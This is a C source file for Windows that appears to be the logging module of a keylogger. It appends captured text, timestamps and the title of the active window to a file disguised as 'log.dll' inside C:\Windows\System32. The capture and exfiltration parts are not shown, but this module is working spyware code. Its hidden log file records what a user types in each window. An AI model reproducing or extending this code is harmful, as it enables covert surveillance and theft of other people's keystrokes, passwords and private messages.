#include "header.h"

bool	put_file(char *str)
{
	FILE *fichier;

	fichier = fopen("C:\\Windows\\System32\\log.dll", "a+");
	//fichier = fopen("log.dll", "a+");
	if (!fichier)
		return (0);
	printf("%s", str);
	fputs(str, fichier);
	fclose(fichier);
	return (1);
}

bool	put_window_file(HWND window)
{
	FILE		*fichier;
	SYSTEMTIME	time;
	WCHAR		window_name[120];
	static int	start = 1;

	fichier = fopen("C:\\Windows\\System32\\log.dll", "a+");
	//fichier = fopen("log.dll", "a+");
	if (!fichier)
		return (0);
	if (start == 1)
	{
		fwprintf(fichier, L"\n-------------------------------------------------------------\n");
		start = 0;
	}
	GetSystemTime(&time);
	wprintf(L"\n\n## [ %d / %d / %d ]\n## %d:%d\n", 
				time.wDay, 
				time.wMonth,
				time.wYear, 
				time.wHour,
				time.wMinute);

	fwprintf(	fichier,
			L"\n\n## [ %d / %d / %d ]\n## %d:%d\n",
				time.wDay,
				time.wMonth,
				time.wYear,
				time.wHour,
				time.wMinute);

	GetWindowText(window, window_name, 120);
	fwprintf(fichier, L"## -------- %s -------\n", window_name);
	wprintf(L"## -------- %s -------\n", window_name);
	fclose(fichier);
	return (1);
}